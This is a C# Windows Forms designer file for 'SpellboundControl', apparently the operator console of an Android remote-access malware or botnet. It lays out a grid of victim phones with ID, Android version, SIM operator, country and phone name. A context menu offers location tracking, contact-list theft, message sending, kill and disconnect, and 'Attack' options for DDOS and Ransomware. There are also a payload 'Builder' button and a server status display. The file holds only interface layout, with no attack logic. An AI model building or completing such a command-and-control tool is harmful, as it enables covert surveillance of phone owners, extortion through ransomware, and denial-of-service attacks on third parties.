using static System.Net.Mime.MediaTypeNames;
using System.Drawing;
using System.Windows.Forms;
using System.Xml.Linq;

namespace SpellboundControl
{
    partial class Main
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
            this.panel1 = new System.Windows.Forms.Panel();
            this.Sever_setting = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.Devices = new System.Windows.Forms.Button();
            this.panel3 = new System.Windows.Forms.Panel();
            this.label3 = new System.Windows.Forms.Label();
            this.panel4 = new System.Windows.Forms.Panel();
            this.Server_Stuts_Led = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.DeviceMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.locationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.attackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dDOSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.ransomwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendMSGToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contactListToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.DebugBox = new System.Windows.Forms.RichTextBox();
            this.Devices_Grid = new System.Windows.Forms.DataGridView();
            this.Device_ID = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Android_Version = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Language = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.SIM_Operator = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Country = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Phone_Name = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.panel2 = new System.Windows.Forms.Panel();
            this.panel1.SuspendLayout();
            this.panel3.SuspendLayout();
            this.panel4.SuspendLayout();
            this.DeviceMenu.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.Devices_Grid)).BeginInit();
            this.panel2.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.Sever_setting);
            this.panel1.Controls.Add(this.button3);
            this.panel1.Controls.Add(this.button2);
            this.panel1.Controls.Add(this.Devices);
            this.panel1.Location = new System.Drawing.Point(10, 10);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(109, 281);
            this.panel1.TabIndex = 0;
            // 
            // Sever_setting
            // 
            this.Sever_setting.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Sever_setting.Location = new System.Drawing.Point(3, 103);
            this.Sever_setting.Name = "Sever_setting";
            this.Sever_setting.Size = new System.Drawing.Size(104, 45);
            this.Sever_setting.TabIndex = 3;
            this.Sever_setting.Text = "Server Setting";
            this.Sever_setting.UseVisualStyleBackColor = true;
            this.Sever_setting.Click += new System.EventHandler(this.Sever_setting_Click_1);
            // 
            // button3
            // 
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Location = new System.Drawing.Point(3, 153);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(104, 45);
            this.button3.TabIndex = 2;
            this.button3.Text = "Builder";
            this.button3.UseVisualStyleBackColor = true;
            // 
            // button2
            // 
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Location = new System.Drawing.Point(3, 53);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(104, 45);
            this.button2.TabIndex = 1;
            this.button2.Text = "Attacks";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // Devices
            // 
            this.Devices.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Devices.Location = new System.Drawing.Point(3, 3);
            this.Devices.Name = "Devices";
            this.Devices.Size = new System.Drawing.Size(104, 45);
            this.Devices.TabIndex = 0;
            this.Devices.Text = "Devices";
            this.Devices.UseVisualStyleBackColor = true;
            this.Devices.Click += new System.EventHandler(this.Devices_Click_1);
            // 
            // panel3
            // 
            this.panel3.BackColor = System.Drawing.Color.Red;
            this.panel3.Controls.Add(this.label3);
            this.panel3.Location = new System.Drawing.Point(129, 9);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(774, 31);
            this.panel3.TabIndex = 2;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Yu Gothic UI Semibold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(104, 10);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(580, 15);
            this.label3.TabIndex = 0;
            this.label3.Text = "Welcome to SpellboundControl V0.0.0.1—please note this early release may have bug" +
    "s and missing features.";
            // 
            // panel4
            // 
            this.panel4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(44)))), ((int)(((byte)(45)))), ((int)(((byte)(44)))));
            this.panel4.Controls.Add(this.Server_Stuts_Led);
            this.panel4.Controls.Add(this.label2);
            this.panel4.Location = new System.Drawing.Point(10, 430);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(106, 73);
            this.panel4.TabIndex = 3;
            // 
            // Server_Stuts_Led
            // 
            this.Server_Stuts_Led.AutoSize = true;
            this.Server_Stuts_Led.Font = new System.Drawing.Font("Yu Gothic UI Semibold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Server_Stuts_Led.ForeColor = System.Drawing.Color.Red;
            this.Server_Stuts_Led.Location = new System.Drawing.Point(11, 31);
            this.Server_Stuts_Led.Name = "Server_Stuts_Led";
            this.Server_Stuts_Led.Size = new System.Drawing.Size(75, 15);
            this.Server_Stuts_Led.TabIndex = 4;
            this.Server_Stuts_Led.Text = "Not Running";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(2, 18);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(103, 13);
            this.label2.TabIndex = 0;
            this.label2.Text = "SERVER STATUS :";
            // 
            // DeviceMenu
            // 
            this.DeviceMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.locationToolStripMenuItem,
            this.attackToolStripMenuItem,
            this.disconnectToolStripMenuItem,
            this.killToolStripMenuItem,
            this.sendMSGToolStripMenuItem,
            this.contactListToolStripMenuItem});
            this.DeviceMenu.Name = "contextMenuStrip1";
            this.DeviceMenu.Size = new System.Drawing.Size(140, 136);
            // 
            // locationToolStripMenuItem
            // 
            this.locationToolStripMenuItem.Name = "locationToolStripMenuItem";
            this.locationToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.locationToolStripMenuItem.Text = "Location";
            this.locationToolStripMenuItem.Click += new System.EventHandler(this.locationToolStripMenuItem_Click);
            // 
            // attackToolStripMenuItem
            // 
            this.attackToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.dDOSToolStripMenuItem,
            this.ransomwareToolStripMenuItem});
            this.attackToolStripMenuItem.Name = "attackToolStripMenuItem";
            this.attackToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.attackToolStripMenuItem.Text = "Attack";
            // 
            // dDOSToolStripMenuItem
            // 
            this.dDOSToolStripMenuItem.Name = "dDOSToolStripMenuItem";
            this.dDOSToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.dDOSToolStripMenuItem.Text = "DDOS";
            // 
            // ransomwareToolStripMenuItem
            // 
            this.ransomwareToolStripMenuItem.Name = "ransomwareToolStripMenuItem";
            this.ransomwareToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.ransomwareToolStripMenuItem.Text = "Ransomware";
            this.ransomwareToolStripMenuItem.Click += new System.EventHandler(this.ransomwareToolStripMenuItem_Click);
            // 
            // disconnectToolStripMenuItem
            // 
            this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
            this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.disconnectToolStripMenuItem.Text = "Disconnect";
            this.disconnectToolStripMenuItem.Click += new System.EventHandler(this.disconnectToolStripMenuItem_Click);
            // 
            // killToolStripMenuItem
            // 
            this.killToolStripMenuItem.Name = "killToolStripMenuItem";
            this.killToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.killToolStripMenuItem.Text = "Kill";
            this.killToolStripMenuItem.Click += new System.EventHandler(this.killToolStripMenuItem_Click);
            // 
            // sendMSGToolStripMenuItem
            // 
            this.sendMSGToolStripMenuItem.Name = "sendMSGToolStripMenuItem";
            this.sendMSGToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.sendMSGToolStripMenuItem.Text = "SendMSG";
            this.sendMSGToolStripMenuItem.Click += new System.EventHandler(this.sendMSGToolStripMenuItem_Click_1);
            // 
            // contactListToolStripMenuItem
            // 
            this.contactListToolStripMenuItem.Name = "contactListToolStripMenuItem";
            this.contactListToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.contactListToolStripMenuItem.Text = "Contact_List";
            this.contactListToolStripMenuItem.Click += new System.EventHandler(this.contactListToolStripMenuItem_Click_1);
            // 
            // DebugBox
            // 
            this.DebugBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.DebugBox.Location = new System.Drawing.Point(5, 362);
            this.DebugBox.Name = "DebugBox";
            this.DebugBox.Size = new System.Drawing.Size(774, 108);
            this.DebugBox.TabIndex = 0;
            this.DebugBox.Text = "";
            // 
            // Devices_Grid
            // 
            this.Devices_Grid.AllowUserToAddRows = false;
            this.Devices_Grid.AllowUserToDeleteRows = false;
            this.Devices_Grid.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.Devices_Grid.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.Devices_Grid.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.Devices_Grid.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Device_ID,
            this.Android_Version,
            this.Language,
            this.SIM_Operator,
            this.Country,
            this.Phone_Name});
            this.Devices_Grid.ContextMenuStrip = this.DeviceMenu;
            this.Devices_Grid.Location = new System.Drawing.Point(5, 6);
            this.Devices_Grid.Name = "Devices_Grid";
            this.Devices_Grid.ReadOnly = true;
            this.Devices_Grid.Size = new System.Drawing.Size(771, 350);
            this.Devices_Grid.TabIndex = 0;
            // 
            // Device_ID
            // 
            this.Device_ID.HeaderText = "ID";
            this.Device_ID.Name = "Device_ID";
            this.Device_ID.ReadOnly = true;
            // 
            // Android_Version
            // 
            this.Android_Version.HeaderText = "Android version";
            this.Android_Version.Name = "Android_Version";
            this.Android_Version.ReadOnly = true;
            // 
            // Language
            // 
            this.Language.HeaderText = "Language";
            this.Language.Name = "Language";
            this.Language.ReadOnly = true;
            // 
            // SIM_Operator
            // 
            this.SIM_Operator.HeaderText = "SIM_Operator";
            this.SIM_Operator.Name = "SIM_Operator";
            this.SIM_Operator.ReadOnly = true;
            // 
            // Country
            // 
            this.Country.HeaderText = "Country";
            this.Country.Name = "Country";
            this.Country.ReadOnly = true;
            // 
            // Phone_Name
            // 
            this.Phone_Name.HeaderText = "Phone_Name";
            this.Phone_Name.Name = "Phone_Name";
            this.Phone_Name.ReadOnly = true;
            // 
            // panel2
            // 
            this.panel2.Controls.Add(this.Devices_Grid);
            this.panel2.Controls.Add(this.DebugBox);
            this.panel2.Location = new System.Drawing.Point(124, 40);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(779, 489);
            this.panel2.TabIndex = 1;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.ClientSize = new System.Drawing.Size(919, 522);
            this.Controls.Add(this.panel4);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Main";
            this.RightToLeftLayout = true;
            this.Text = "[DEV]-SpellboundControl-[V0.0.0.1]";
            this.panel1.ResumeLayout(false);
            this.panel3.ResumeLayout(false);
            this.panel3.PerformLayout();
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            this.DeviceMenu.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.Devices_Grid)).EndInit();
            this.panel2.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private Panel panel1;
        private Button button3;
        private Button button2;
        private Button Devices;
        private Panel panel3;
        private Button Sever_setting;
        private Panel panel4;
        private Label label2;
        private Label Server_Stuts_Led;
        private MenuStrip menuStrip1;
        private ContextMenuStrip DeviceMenu;
        private ToolStripMenuItem locationToolStripMenuItem;
        private ToolStripMenuItem attackToolStripMenuItem;
        private ToolStripMenuItem killToolStripMenuItem;
        private ToolStripMenuItem dDOSToolStripMenuItem;
        private ToolStripMenuItem ransomwareToolStripMenuItem;
        private ToolStripMenuItem sendMSGToolStripMenuItem;
        private ToolStripMenuItem contactListToolStripMenuItem;
        private Label label3;
        private ToolStripMenuItem disconnectToolStripMenuItem;
        private RichTextBox DebugBox;
        private DataGridView Devices_Grid;
        private DataGridViewTextBoxColumn Device_ID;
        private DataGridViewTextBoxColumn Android_Version;
        private DataGridViewTextBoxColumn Language;
        private DataGridViewTextBoxColumn SIM_Operator;
        private DataGridViewTextBoxColumn Country;
        private DataGridViewTextBoxColumn Phone_Name;
        private Panel panel2;
    }
}
